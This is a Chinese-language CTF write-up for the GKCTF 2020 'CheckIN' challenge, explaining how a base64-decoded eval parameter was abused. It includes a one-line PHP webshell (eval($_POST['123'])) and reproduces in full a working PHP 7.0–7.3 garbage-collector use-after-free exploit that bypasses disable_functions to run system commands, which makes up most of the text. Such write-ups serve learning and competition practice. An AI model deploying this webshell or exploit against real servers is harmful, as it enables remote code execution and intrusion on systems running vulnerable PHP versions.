# 【GKCTF 2020】CheckIN


# [GKCTF 2020]CheckIN

## 思路
* 进入后发现显示源码，可以进行REQUEST，可以**GET传参Ginkgo**来执行命令，但是需要base64加密。

  ```
  &lt;?php 
  highlight_file(__FILE__);
  class ClassName
  {
          public $code = null;
          public $decode = null;
          function __construct()
          {
                  $this-&gt;code = @$this-&gt;x()[&#39;Ginkgo&#39;];
                  $this-&gt;decode = @base64_decode( $this-&gt;code );
                  @Eval($this-&gt;decode);
          }
  
          public function x()
          {
                  return $_REQUEST;
          }
  }
  new ClassName(); 
  ```

* 使用`system(&#34;ls /&#34;);`但是发现这个啥也执行不出来。考虑看一下`phpinfo();`有没有`disabled_function`

  发现大部分执行系统命令的都被ban了。直接**一句话木马**！

  &gt; 记得base64加密

  ```
  eval($_POST[&#39;123&#39;]);
  ```

* 根目录找到flag，但是flag文件不可读。发现有readflag文件，但权限不够。

* 依据官方wp，这个是一个PHP漏洞

  **PHP版本7.3.18漏洞**:
  php7-gc-bypass漏洞利用PHP garbage collector程序中的堆溢出触发进而执行命令，影响范围为linux，php7.0-7.3

* 利用官方给的地址里面的exp对这个漏洞进行利用[exploits](https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php)。

* 上传php文件到 `/tmp`

  &gt; 这里是因为其它文件没有权限

* 在前端request的时候直接使用include直接显示这个页面的东西

  &gt; 记得base64加密

  ```
  include(&#39;/tmp/flag.php&#39;);	# 文件名可以自己随意用的
  ```

  之后就成功拿flag

## EXP

这里放上上传的exp，上传为tmp/flag.php

&gt; 需要注意的是：pwn(&#34;/readflag&#34;)要自己修改

```
&lt;?php

# PHP 7.0-7.3 disable_functions bypass PoC (*nix only)
#
# Bug: https://bugs.php.net/bug.php?id=72530
#
# This exploit should work on all PHP 7.0-7.3 versions
#
# Author: https://github.com/mm0r1

pwn(&#34;/readflag&#34;);

function pwn($cmd) {
    global $abc, $helper;

    function str2ptr(&amp;$str, $p = 0, $s = 8) {
        $address = 0;
        for($j = $s-1; $j &gt;= 0; $j--) {
            $address &lt;&lt;= 8;
            $address |= ord($str[$p&#43;$j]);
        }
        return $address;
    }

    function ptr2str($ptr, $m = 8) {
        $out = &#34;&#34;;
        for ($i=0; $i &lt; $m; $i&#43;&#43;) {
            $out .= chr($ptr &amp; 0xff);
            $ptr &gt;&gt;= 8;
        }
        return $out;
    }

    function write(&amp;$str, $p, $v, $n = 8) {
        $i = 0;
        for($i = 0; $i &lt; $n; $i&#43;&#43;) {
            $str[$p &#43; $i] = chr($v &amp; 0xff);
            $v &gt;&gt;= 8;
        }
    }

    function leak($addr, $p = 0, $s = 8) {
        global $abc, $helper;
        write($abc, 0x68, $addr &#43; $p - 0x10);
        $leak = strlen($helper-&gt;a);
        if($s != 8) { $leak %= 2 &lt;&lt; ($s * 8) - 1; }
        return $leak;
    }

    function parse_elf($base) {
        $e_type = leak($base, 0x10, 2);

        $e_phoff = leak($base, 0x20);
        $e_phentsize = leak($base, 0x36, 2);
        $e_phnum = leak($base, 0x38, 2);

        for($i = 0; $i &lt; $e_phnum; $i&#43;&#43;) {
            $header = $base &#43; $e_phoff &#43; $i * $e_phentsize;
            $p_type  = leak($header, 0, 4);
            $p_flags = leak($header, 4, 4);
            $p_vaddr = leak($header, 0x10);
            $p_memsz = leak($header, 0x28);

            if($p_type == 1 &amp;&amp; $p_flags == 6) { # PT_LOAD, PF_Read_Write
                # handle pie
                $data_addr = $e_type == 2 ? $p_vaddr : $base &#43; $p_vaddr;
                $data_size = $p_memsz;
            } else if($p_type == 1 &amp;&amp; $p_flags == 5) { # PT_LOAD, PF_Read_exec
                $text_size = $p_memsz;
            }
        }

        if(!$data_addr || !$text_size || !$data_size)
            return false;

        return [$data_addr, $text_size, $data_size];
    }

    function get_basic_funcs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i &lt; $data_size / 8; $i&#43;&#43;) {
            $leak = leak($data_addr, $i * 8);
            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) {
                $deref = leak($leak);
                # &#39;constant&#39; constant check
                if($deref != 0x746e6174736e6f63)
                    continue;
            } else continue;

            $leak = leak($data_addr, ($i &#43; 4) * 8);
            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) {
                $deref = leak($leak);
                # &#39;bin2hex&#39; constant check
                if($deref != 0x786568326e6962)
                    continue;
            } else continue;

            return $data_addr &#43; $i * 8;
        }
    }

    function get_binary_base($binary_leak) {
        $base = 0;
        $start = $binary_leak &amp; 0xfffffffffffff000;
        for($i = 0; $i &lt; 0x1000; $i&#43;&#43;) {
            $addr = $start - 0x1000 * $i;
            $leak = leak($addr, 0, 7);
            if($leak == 0x10102464c457f) { # ELF header
                return $addr;
            }
        }
    }

    function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = leak($addr);
            $f_name = leak($f_entry, 0, 6);

            if($f_name == 0x6d6574737973) { # system
                return leak($addr &#43; 8);
            }
            $addr &#43;= 0x20;
        } while($f_entry != 0);
        return false;
    }

    class ryat {
        var $ryat;
        var $chtg;
        
        function __destruct()
        {
            $this-&gt;chtg = $this-&gt;ryat;
            $this-&gt;ryat = 1;
        }
    }

    class Helper {
        public $a, $b, $c, $d;
    }

    if(stristr(PHP_OS, &#39;WIN&#39;)) {
        die(&#39;This PoC is for *nix systems only.&#39;);
    }

    $n_alloc = 10; # increase this value if you get segfaults

    $contiguous = [];
    for($i = 0; $i &lt; $n_alloc; $i&#43;&#43;)
        $contiguous[] = str_repeat(&#39;A&#39;, 79);

    $poc = &#39;a:4:{i:0;i:1;i:1;a:1:{i:0;O:4:&#34;ryat&#34;:2:{s:4:&#34;ryat&#34;;R:3;s:4:&#34;chtg&#34;;i:2;}}i:1;i:3;i:2;R:5;}&#39;;
    $out = unserialize($poc);
    gc_collect_cycles();

    $v = [];
    $v[0] = ptr2str(0, 79);
    unset($v);
    $abc = $out[2][0];

    $helper = new Helper;
    $helper-&gt;b = function ($x) { };

    if(strlen($abc) == 79 || strlen($abc) == 0) {
        die(&#34;UAF failed&#34;);
    }

    # leaks
    $closure_handlers = str2ptr($abc, 0);
    $php_heap = str2ptr($abc, 0x58);
    $abc_addr = $php_heap - 0xc8;

    # fake value
    write($abc, 0x60, 2);
    write($abc, 0x70, 6);

    # fake reference
    write($abc, 0x10, $abc_addr &#43; 0x60);
    write($abc, 0x18, 0xa);

    $closure_obj = str2ptr($abc, 0x20);

    $binary_leak = leak($closure_handlers, 8);
    if(!($base = get_binary_base($binary_leak))) {
        die(&#34;Couldn&#39;t determine binary base address&#34;);
    }

    if(!($elf = parse_elf($base))) {
        die(&#34;Couldn&#39;t parse ELF header&#34;);
    }

    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
        die(&#34;Couldn&#39;t get basic_functions address&#34;);
    }

    if(!($zif_system = get_system($basic_funcs))) {
        die(&#34;Couldn&#39;t get zif_system address&#34;);
    }

    # fake closure object
    $fake_obj_offset = 0xd0;
    for($i = 0; $i &lt; 0x110; $i &#43;= 8) {
        write($abc, $fake_obj_offset &#43; $i, leak($closure_obj, $i));
    }

    # pwn
    write($abc, 0x20, $abc_addr &#43; $fake_obj_offset);
    write($abc, 0xd0 &#43; 0x38, 1, 4); # internal func type
    write($abc, 0xd0 &#43; 0x68, $zif_system); # internal func handler

    ($helper-&gt;b)($cmd);

    exit();
}
```

## 总结

* diable_function绕过
* php漏洞利用

---

> Author: [Ting](Tin10g.github.io)  
> URL: http://localhost:1313/posts/2024%E5%81%9A%E9%A2%98-gkctf-2020checkin/  

